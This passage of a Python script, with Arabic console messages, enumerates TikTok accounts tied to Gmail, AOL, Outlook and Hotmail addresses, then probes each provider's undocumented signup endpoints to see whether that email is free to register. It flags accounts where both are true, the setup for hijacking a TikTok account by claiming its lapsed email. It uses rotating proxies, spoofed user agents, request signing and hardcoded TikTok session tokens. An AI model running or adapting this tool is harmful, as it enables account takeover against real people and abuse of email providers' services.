            f"%22hasLiedBrowser%22%3A0%2C%22touchSupport%22%3A%7B%22points%22%3A0%2C%22event%22%3A0%2C%22start%22%3A0%7D%2C"
            f"%22fonts%22%3A%7B%22count%22%3A33%2C%22hash%22%3A%22edeefd360161b4bf944ac045e41d0b21%22%7D%2C"
            f"%22audio%22%3A%22124.04347527516074%22%2C%22resolution%22%3A%7B%22w%22%3A%221600%22%2C%22h%22%3A%22900%22%7D%2C"
            f"%22availableResolution%22%3A%7B%22w%22%3A%22860%22%2C%22h%22%3A%221600%22%7D%2C%22ts%22%3A%7B"
            f"%22serve%22%3A1704793094844%2C%22render%22%3A1704793096534%7D%7D"
            f"&specId={specId}&cacheStored=&crumb={crumb}&acrumb={acrumb}&sessionIndex={sessionIndex}"
            f"&done=https%3A%2F%2Fwww.aol.com&googleIdToken=&authCode=&attrSetIndex=0&specData={specData}"
            f"&multiDomain=&tos0=oath_freereg%7Cus%7Cen-US&firstName=&lastName=&userid-domain=yahoo&userId={email}"
            f"&password=&mm=&dd=&yyyy=&signup="
        )

        response_post = session.post("https://login.aol.com/account/module/create", params=params, headers=headers_post, data=data, timeout=15)

        if response_post.status_code == 200:
            response_text = response_post.text

            if '{"errors":[{"name":"firstName","error":"FIELD_EMPTY"},{"name":"lastName","error":"FIELD_EMPTY"},{"name":"birthDate","error":"INVALID_BIRTHDATE"},{"name":"password","error":"FIELD_EMPTY"}]}' in response_text:
                with stats_lock:
                    yas += 1
                with console_lock:
                    console.print(f"[green]✅ AOL متاح: {email}@aol.com[/green]")
                return True
            elif '"name":"userId"' in response_text or 'USERNAME_UNAVAILABLE' in response_text or 'taken' in response_text.lower():
                with stats_lock:
                    nod += 1
                with console_lock:
                    console.print(f"[red]❌ AOL غير متاح: {email}@aol.com[/red]")
                return False
            else:
                with stats_lock:
                    yas += 1
                with console_lock:
                    console.print(f"[green]✅ AOL متاح: {email}@aol.com[/green]")
                return True
        else:
            with console_lock:
                console.print(f"[red]❌ خطأ HTTP من AOL: {response_post.status_code}[/red]")
            with stats_lock:
                nod += 1
            return False

    except Exception as e:
        with console_lock:
            console.print(f"[red]❌ خطأ في فحص AOL: {str(e)}[/red]")
        with stats_lock:
            nod += 1
        return False

def check_mail_ru(email):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    try:
        session = requests.Session()

        headers_get = {
            'User-Agent': generate_user_agent(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }

        response = session.get('https://account.mail.ru/signup', headers=headers_get, timeout=15)

        headers_post = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://account.mail.ru',
            'Connection': 'keep-alive',
            'Referer': 'https://account.mail.ru/signup'
        }

        check_data = {
            'email': email + '@mail.ru'
        }

        check_response = session.post('https://account.mail.ru/api/v1/user/exists', 
                                    data=check_data, 
                                    headers=headers_post, 
                                    timeout=15)

        if check_response.status_code == 200:
            result = check_response.json()

            if result.get('body', {}).get('exists', False):
                nod += 1
                console.print(f"[red]❌ Mail.ru غير متاح: {email}@mail.ru[/red]")
                return False
            else:
                yas += 1
                console.print(f"[green]✅ Mail.ru متاح: {email}@mail.ru[/green]")
                return True
        else:
            signup_data = {
                'email': email + '@mail.ru',
                'name': 'test',
                'surname': 'test',
                'birthday_day': '1',
                'birthday_month': '1',
                'birthday_year': '1990',
                'password': 'TestPassword123!',
                'password_confirm': 'TestPassword123!'
            }

            signup_response = session.post('https://account.mail.ru/api/v1/user/signup', 
                                         data=signup_data, 
                                         headers=headers_post, 
                                         timeout=15)

            if signup_response.status_code == 200:
                signup_result = signup_response.json()

                if 'errors' in signup_result and 'email' in str(signup_result['errors']):
                    if 'already' in str(signup_result['errors']).lower() or 'exists' in str(signup_result['errors']).lower():
                        nod += 1
                        console.print(f"[red]❌ Mail.ru غير متاح: {email}@mail.ru[/red]")
                        return False
                    else:
                        yas += 1
                        console.print(f"[green]✅ Mail.ru متاح: {email}@mail.ru[/green]")
                        return True
                else:
                    yas += 1
                    console.print(f"[green]✅ Mail.ru متاح: {email}@mail.ru[/green]")
                    return True
            else:
                console.print(f"[red]❌ خطأ في فحص Mail.ru: HTTP {signup_response.status_code}[/red]")
                nod += 1
                return False

    except Exception as e:
        console.print(f"[red]❌ خطأ في فحص Mail.ru: {str(e)}[/red]")
        nod += 1
        return False

class GmailChecker:
    def __init__(self, email):
        self.email = email
        if "@" in self.email:
            self.email = self.email.split("@")[0]
        self.TL = None
        self.__Host_GAPS = None
        self.base_url = 'https://accounts.google.com/_/signup'
        self.headers = {
            'user-agent': generate_user_agent(),
            'google-accounts-xsrf': '1',
        }

    def check(self):
        try:
            url = self.base_url + '/validatepersonaldetails'
            params = {
                'hl': "ar",
                '_reqid': "74404",
                'rt': "j"
            }
            payload = {
                'f.req': "[\"AEThLlymT9V_0eW9Zw42mUXBqA3s9U9ljzwK7Jia8M4qy_5H3vwDL4GhSJXkUXTnPL_roS69KYSkaVJLdkmOC6bPDO0jy5qaBZR0nGnsWOb1bhxEY_YOrhedYnF3CldZzhireOeUd-vT8WbFd7SXxfhuWiGNtuPBrMKSLuMomStQkZieaIHlfdka8G45OmseoCfbsvWmoc7U\",\"L7N\",\"ToPython\",\"L7N\",\"ToPython\",0,0,null,null,null,0,null,1,[],1]",
                'deviceinfo': "[null,null,null,null,null,\"IQ\",null,null,null,\"GlifWebSignIn\",null,[],null,null,null,null,1,null,0,1,\"\",null,null,1,1,2]",
            }

            __Host_GAPS = ''.join(secrets.choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(secrets.randbelow(16) + 15))
            cookies = {'__Host-GAPS': __Host_GAPS}

            response = requests.post(url, cookies=cookies, params=params, data=payload, headers=self.headers, timeout=10)
            if response.status_code != 200:
                return None

            if '",null,"' not in response.text:
                return None

            self.TL = str(response.text).split('",null,"')[1].split('"')[0]
            self.__Host_GAPS = response.cookies.get_dict().get('__Host-GAPS')

            url = self.base_url + '/usernameavailability'
            cookies = {'__Host-GAPS': self.__Host_GAPS}
            params = {'TL': self.TL}
            data = {
                'continue': 'https://mail.google.com/mail/u/0/',
                'ddm': '0',
                'flowEntry': 'SignUp',
                'service': 'mail',
                'theme': 'mn',
                'f.req': f'["TL:{self.TL}","{self.email}",0,0,1,null,0,5167]',
                'azt': 'AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig:1712322460888',
                'cookiesDisabled': 'false',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
                'gmscoreversion': 'undefined',
                'flowName': 'GlifWebSignIn'
            }

            response = requests.post(url, params=params, cookies=cookies, headers=self.headers, data=data, timeout=10)

            if response.status_code == 200:
                if '"gf.uar",1' in response.text:
                    return {"available": True}
                else:
                    return {"available": False}
            else:
                return None

        except requests.exceptions.RequestException as e:
            return None
        except Exception as e:
            return None

def get_canary_and_amsc():
    try:
        response = requests.get('https://account.live.com/signup', timeout=15)
        amsc = response.cookies.get_dict().get('amsc')
        match = re.search(r'"apiCanary":"(.*?)"', response.text)
        if match:
            canary = match.group(1).encode('utf-8').decode('unicode_escape')
        else:
            canary = None
        return canary, amsc
    except Exception as e:
        console.print(f"[red]❌ خطأ في الحصول على بيانات Microsoft: {str(e)}[/red]")
        return None, None

def check_microsoft_email(email, domain):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    full_email = f"{email}@{domain}"

    try:
        canary, amsc = get_canary_and_amsc()

        if not canary or not amsc:
            console.print(f"[red]❌ تعذر الحصول على بيانات Microsoft لفحص: {full_email}[/red]")
            nod += 1
            return False

        url = "https://signup.live.com/API/CheckAvailableSigninNames"
        headers = {
            "Canary": canary,
            "Cookie": f"amsc={amsc}",
            "Content-Type": "application/json",
            "User-Agent": generate_user_agent()
        }
        data = {"includeSuggestions": True, "signInName": full_email}

        response = requests.post(url, headers=headers, data=json.dumps(data), timeout=15)
        result = response.json().get('isAvailable', None)

        if isinstance(result, bool):
            if result:
                with stats_lock:
                    yas += 1
                with console_lock:
                    console.print(f"[green]✅ Microsoft متاح: {full_email}[/green]")
                return True
            else:
                with stats_lock:
                    nod += 1
                with console_lock:
                    console.print(f"[red]❌ Microsoft غير متاح: {full_email}[/red]")
                return False
        else:
            with console_lock:
                console.print(f"[yellow]⚠️ استجابة غير متوقعة من Microsoft: {full_email}[/yellow]")
            with stats_lock:
                nod += 1
            return False

    except Exception as e:
        with console_lock:
            console.print(f"[red]❌ خطأ في فحص Microsoft: {str(e)}[/red]")
        with stats_lock:
            nod += 1
        return False

def check_proton_email(email, domain):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    full_email = f"{email}@{domain}"

    try:
        url1 = "https://account.proton.me/signup"
        headers1 = {
            'User-Agent': generate_user_agent(),
        }
        response1 = requests.get(url1, headers=headers1, timeout=15)
        csrf_token = response1.cookies.get('Session-Id')

        url2 = "https://account.proton.me/api/auth/v4/sessions"
        headers2 = {
            'User-Agent': generate_user_agent(),
            'Accept': "application/vnd.protonmail.v1+json",
            'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            'sec-ch-ua-mobile': "?1",
            'x-pm-locale': "en_US",
            'x-enforce-unauthsession': "true",
            'x-pm-appversion': "web-account@5.0.180.1",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://account.proton.me",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://account.proton.me/login",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            'Cookie': f"Session-Id={csrf_token}; Tag=default; Domain=proton.me"
        }

        response2 = requests.post(url2, headers=headers2, timeout=15)
        data = response2.json()

        url3 = "https://account.proton.me/api/core/v4/auth/cookies"
        payload = json.dumps({
            "UID": data.get("UID"),
            "ResponseType": "token",
            "GrantType": "refresh_token",
            "RefreshToken": data.get("RefreshToken"),
            "RedirectURI": "https://protonmail.com",
            "Persistent": 0,
            "State": "JsPqKvikF2R5RM625tUlyVtO"
        })
        headers3 = headers2.copy()
        headers3.update({
            'Content-Type': "application/json",
            'authorization': f"Bearer {data.get('AccessToken')}",
            'x-pm-uid': data.get("UID"),
        })

        response3 = requests.post(url3, data=payload, headers=headers3, timeout=15)

        auth_value = None
        for cookie in response3.cookies:
            if cookie.name.startswith("AUTH-"):
                auth_value = cookie.value
                break

        url4 = "https://account.proton.me/api/domains/available"
        params1 = {'Type': "login"}

        headers4 = headers3.copy()
        headers4.update({
            'Cookie': f"AUTH-{data.get('UID')}={auth_value}; Session-Id={csrf_token}; Tag=default; Domain=proton.me; Features=InboxNewUpsellModals:new"
        })

        response4 = requests.get(url4, params=params1, headers=headers4, timeout=15)

        url5 = "https://account.proton.me/api/core/v4/users/available"
        params2 = {
            'Name': full_email,
            'ParseDomain': "1"
        }

        response5 = requests.get(url5, params=params2, headers=headers4, timeout=15)
        obj = response5.json()
        code = obj.get("Code") if isinstance(obj, dict) else None

        if code == 1000:
            yas += 1
            console.print(f"[green]✅ ProtonMail متاح: {full_email}[/green]")
            return True
        elif code == 12106:
            nod += 1
            console.print(f"[red]❌ ProtonMail غير متاح: {full_email}[/red]")
            return False
        else:
            nod += 1
            console.print(f"[yellow]⚠️ استجابة غير متوقعة من ProtonMail: {full_email}[/yellow]")
            return False

    except Exception as e:
        console.print(f"[red]❌ خطأ في فحص ProtonMail: {str(e)}[/red]")
        nod += 1
        return False

def check_temp_email(email, domain):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    full_email = f"{email}@{domain}"

    try:
        url = "https://hi2.in/api/custom"
        payload = {
            'domain': f"@{domain}",
            'prefix': email,
        }
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': "application/json, text/plain, */*",
            'sec-ch-ua-platform': "\"Android\"",
            'authorization': "Basic bnVsbA==",
            'sec-ch-ua': "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Google Chrome\";v=\"138\"",
            'sec-ch-ua-mobile': "?1",
            'origin': "https://hi2.in",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://hi2.in/",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7",
            'priority': "u=1, i",
            'Cookie': "_ga=GA1.1.1221514076.1754915571; _ga_02VF9D5F26=GS2.1.s1754915570$o1$g1$t1754915635$j59$l0$h0"
        }

        response = requests.post(url, data=payload, headers=headers, timeout=15)

        if 'address already taken' in response.text:
            nod += 1
            console.print(f"[red]❌ البريد المؤقت غير متاح: {full_email}[/red]")
            return False
        else:
            yas += 1
            console.print(f"[green]✅ البريد المؤقت متاح: {full_email}[/green]")
            return True

    except Exception as e:
        console.print(f"[red]❌ خطأ في فحص البريد المؤقت: {str(e)}[/red]")
        nod += 1
        return False

def check_gmail(email):
    global ya, no, yas, nod
    if '@' in email:
        email = email.split('@')[0]

    try:
        gmail_checker = GmailChecker(email)
        result = gmail_checker.check()

        if result is not None:
            if result["available"]:
                with stats_lock:
                    yas += 1
                with console_lock:
                    console.print(f"[green]✅ Gmail متاح: {email}@gmail.com[/green]")
                return True
            else:
                with stats_lock:
                    nod += 1
                with console_lock:
                    console.print(f"[red]❌ Gmail غير متاح: {email}@gmail.com[/red]")
                return False
        else:
            with console_lock:
                console.print(f"[yellow]⚠️ خطأ في فحص Gmail: {email}@gmail.com[/yellow]")
            with stats_lock:
                nod += 1
            return False

    except Exception as e:
        with console_lock:
            console.print(f"[red]❌ خطأ في فحص Gmail: {str(e)}[/red]")
        with stats_lock:
            nod += 1
        return False

def check_tiktok_email(email):
    params = {
        "request_tag_from": "h5",
        "fixed_mix_mode": "1",
        "mix_mode": "1",
        "account_param": email,
        "scene": "1",
        "iid": "7545257025581532984",
        "device_id": "7475720893948626433",
        "ac": "wifi",
        "channel": "googleplay",
        "aid": "1233",
        "app_name": "musical_ly",
        "version_code": "250904",
        "version_name": "25.9.4",
        "device_platform": "android",
        "ab_version": "25.9.4",
        "ssmix": "a",
        "device_type": "SM-A600F",
        "device_brand": "samsung",
        "language": "ar",
        "os_api": "29",
        "os_version": "10",
        "openudid": "f516ef8f8e5741d8",
        "manifest_version_code": "2022509040",
        "resolution": "720*1384",
        "dpi": "320",
        "update_version_code": "2022509040",
        "_rticket": str(int(time.time() * 1000)),
        "current_region": "IQ",
        "app_type": "normal",
        "sys_region": "IQ",
        "mcc_mnc": "41820",
        "timezone_name": "Asia/Baghdad",
        "carrier_region_v2": "418",
        "residence": "IQ",
        "app_language": "ar",
        "carrier_region": "IQ",
        "ac2": "wifi5g",
        "uoo": "0",
        "op_region": "IQ",
        "timezone_offset": "10800",
        "build_number": "25.9.4",
        "host_abi": "armeabi-v7a",
        "locale": "ar",
        "region": "IQ",
        "ts": str(int(time.time())),
        "cdid": "d96c85b4-30e9-4053-8cb1-075f871f462c",
        "support_webview": "1",
        "cronet_version": "ae513f3c_2022-08-08",
        "ttnet_version": "4.1.103.11-tiktok"
    }
    params['app_version'] = params['version_name']

    try:
        if SIGNER_AVAILABLE:
            from SignerPy import sign, get
            processed_params = get(params=params)
            signature = sign(params=processed_params)
        else:
            processed_params = params
            signature = {}
    except Exception:
        return "خطأ"

    headers = {
        'User-Agent': "com.zhiliaoapp.musically/2022509040 (Linux; U; Android 10; ar; SM-A600F; Build/QP1A.190711.020; Cronet/TTNetVersion:ae513f3c 2022-08-08 QuicVersion:12a1d5c5 2022-06-27)",
        'Accept': "application/json, text/plain, */*",
        'content-length': "0",
        'x-tt-passport-csrf-token': "c9bcaa0611f96ffe0d1af9172ceb46f6",
        'x-tt-multi-sids': "7500701931134043153%3A8c0ec1946b85ab340a709e5121620bd1",
        'sdk-version': "2",
        'x-tt-token': "038c0ec1946b85ab340a709e5121620bd105c8c28813858f8aa3fa53fdda7b3a3282a623ca3117c7584d56005ca0f913b4d8cf5220e5d65ee4e37a5a797f64da2c64369e4c5aa76f02b618a259c197fe5b5c09298bb2b9635fb74aa7c46eb1827a2f6--0a4e0a203819dac74b3643d2e68fec945fc77ba821f65817d31601529e443257607382c912200b9f2ff68dd4aa023d8740472211f59b5eb6a01b2ffb3848bfc4b31ec30ed0ed1801220674696b746f6b-3.0.0",
        'multi_login': "1",
        'passport-sdk-version': "19",
        'x-bd-kmsv': "0",
        'x-vc-bdturing-sdk-version': "2.2.1.i18n",
        'x-tt-dm-status': "login=1;ct=1;rt=1",
        'x-tt-cmpl-token': "AgQQAPOnF-RPsLgpNg3zZh0o_d6BuCxZP4MsYN1Qwg",
        'content-type': "application/x-www-form-urlencoded",
        'x-tt-store-region': "iq",
        'x-tt-store-region-src': "uid",
        'x-tt-store-region-uid': "iq",
        'x-tt-store-region-did': "iq",
        'x-ss-dp': "1233",
        'x-tt-trace-id': "00-0a8da3691067bf188b83c606014d04d1-0a8da3691067bf18-01",
    }

    if signature:
        headers.update({
            'x-ss-req-ticket': signature.get('x-ss-req-ticket', ''),
            'x-ss-stub': signature.get('x-ss-stub', ''),
            'x-argus': signature.get("x-argus", ''),
            'x-gorgon': signature.get("x-gorgon", ''),
            'x-khronos': signature.get("x-khronos", ''),
            'x-ladon': signature.get("x-ladon", ''),
        })

    try:
        resp = requests.post(BASE_URL, headers=headers, params=processed_params, proxies=get_random_proxy(), timeout=20)
        print(resp.text)
    except Exception:
        return "خطأ"

    try:
        data = resp.json()
    except Exception:
        return "خطأ"

    if resp.status_code == 200:
        content = data.get('data')
        if content and isinstance(content, dict) and content.get('accounts'):
            return "مسجل"
        else:
            return "غير متاح"
    else:
        return "خطأ"

def check_single_domain(email, domain):
    global ya, no, yas, nod

    full_email = email + domain

    with console_lock:
        console.print(f"[cyan]🔍 فحص {full_email} في TikTok...[/cyan]")

    result = check_tiktok_email(full_email)

    if result == "مسجل":
        with stats_lock:
            ya += 1
        with console_lock:
            console.print(f"[green]✅ تم العثور على حساب TikTok: {full_email}[/green]")
            console.print(f"[cyan]🔍 فحص توفر {full_email} للتسجيل...[/cyan]")

        is_available = False
        if domain == '@gmail.com':
            is_available = check_gmail(email)
        elif domain == '@aol.com':
            is_available = check_aol(email)
        elif domain in ['@outlook.com', '@hotmail.com']:
            domain_name = domain.replace('@', '')
            is_available = check_microsoft_email(email, domain_name)

        if is_available:
            with console_lock:
                console.print(f"[bright_green]🎯 حساب TikTok موجود والإيميل متاح للتسجيل: {full_email}[/bright_green]")
            info(full_email)
        else:
            with console_lock:
                console.print(f"[yellow]⚠️ حساب TikTok موجود لكن الإيميل غير متاح للتسجيل: {full_email}[/yellow]")

    else:
        with stats_lock:
            no += 1
        with console_lock:
            console.print(f"[red]❌ لم يتم العثور على حساب TikTok: {full_email}[/red]")

def chzm(email):
    global ya, no, yas, nod

    domains_to_check = [
        '@gmail.com', '@aol.com',
        '@outlook.com', '@hotmail.com'
    ]

    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(check_single_domain, email, domain) for domain in domains_to_check]

        for future in as_completed(futures):
            try:
                future.result()
            except Exception as e:
                with console_lock:
                    console.print(f"[red]❌ خطأ في المعالجة المتوازية: {str(e)}[/red]")

def periodic_proxy_monitor():
    while True:
        time.sleep(18000000)
        monitor_proxy_usage()

def main():
    global ya, no, nod, yas

    console.print(Panel.fit("🚀 بدء تشغيل TikTok Gmail Checker السريع", style="bold blue"))
    
    proxy_monitor_thread = threading.Thread(target=periodic_proxy_monitor, daemon=True)
    proxy_monitor_thread.start()
    console.print("[cyan]🔒 تم تفعيل مراقبة البروكسي الآمنة[/cyan]")

    try:
        with open(fileuser, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except:
        console.print('[red]File Username not found ![/red]')
        return

    console.print(f"[cyan]📁 تم تحميل {len(users)} يوزر للفحص[/cyan]")
    console.print(f"[yellow]⚡ استخدام المعالجة المتوازية لتسريع الفحص...[/yellow]")

    with Live(update_display(), refresh_per_second=2, console=console) as live:
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = []

            for i, user in enumerate(users, 1):
                future = executor.submit(chzm, user)
                futures.append((future, user, i))

            completed = 0
            for future, user, i in futures:
                try:
                    current_email = f"فحص {i}/{len(users)}: {user}"
                    live.update(update_display(current_email))
                    future.result()
                    completed += 1

                    if completed % 5 == 0:
                        live.update(update_display(f"تم إنجاز {completed}/{len(users)}"))

                except Exception as e:
                    with console_lock:
                        console.print(f"[red]❌ خطأ في معالجة {user}: {str(e)}[/red]")

    console.print(Panel.fit("✅ انتهى الفحص السريع بنجاح", style="bold green"))
    console.print(f"[cyan]📊 النتائج النهائية: {ya} حساب TikTok موجود | {no} حساب TikTok غير موجود | {yas} إيميل متاح | {nod} إيميل غير متاح[/cyan]")

if __name__ == "__main__":
    main()
